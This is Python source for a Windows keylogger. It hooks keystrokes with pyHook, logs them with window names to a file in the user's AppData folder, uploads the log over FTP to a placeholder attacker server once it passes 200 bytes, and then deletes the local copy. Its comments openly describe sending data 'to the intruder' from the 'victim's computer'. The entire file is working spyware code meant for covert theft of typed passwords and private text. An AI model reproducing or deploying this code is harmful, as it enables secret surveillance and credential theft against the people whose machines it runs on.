import pythoncom, pyHook
import sys, thread, datetime, os
import ftplib

BUFF    = ""
LOG_FILE_NAME = os.path.expanduser('~')+"\\AppData\\Local\\log.txt" #Change file name and path as you wish
FTP_SRV_IP, FTP_SRV_PRT = "W.X.Y.Z", 8888 #IP and PORT of FTPserver to send to

def translate(event):
	"""
		Converts Windows virtual key codes to ascii characters.
		If key code is an alphabet, use it's ascii value, otherwise, use key
		name.
	"""
	if(event.Ascii >= 0 and event.Ascii <= 31) or (event.Ascii == 127):
		return event.Key
	else:
		return chr(event.Ascii)

def ftp_transfer(ip, port, filname):
    """
        Transfers captured data to the intruder via FTP.
        Removes the file from victim's computer after transfer.
    """
    
    ftp = ftplib.FTP()
    ftp.connect(ip, port)
    ftp.login("victim-one", "12345")

    logfile = open(filname,'rb')
    now = datetime.datetime.now()
    now = str(now).replace(":", ".")
    ftp.storbinary('STOR '+now+'.txt', logfile)
    ftp.quit()
    logfile.close()

    try:
        os.remove(filname)
    except OSError:
        pass
    return

def intercept(event):
        """
		Intercepts keystrokes events, appends them to a buffer after translating
        them to chars, if char is ENTER or TAB logs the buffer into a file.
        If file size is bigger than a defined threashold, starts FTP transfer.
	"""
	global BUFF

	BUFF += translate(event)
	
	if(event.Ascii == 13 or event.Ascii == 9):
	    
        window_name = event.WindowName
        chunk = {'client_id': 3, 'window_nm': window_name, 'captured' : BUFF}

        logfile = open(LOG_FILE_NAME, "a")
        logfile.write(str(chunk)+'\n')
        logfile.close()
        BUFF = ""

        #if file size is more than 200 bytes, send via ftp
        if(os.path.getsize(LOG_FILE_NAME) >= 200):
                thread.start_new_thread(ftp_transfer, (FTP_SRV_IP, FTP_SRV_PRT, LOG_FILE_NAME))

	return True

def main():
    obj = pyHook.HookManager()
    obj.KeyDown = intercept
    obj.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == '__main__':
    main()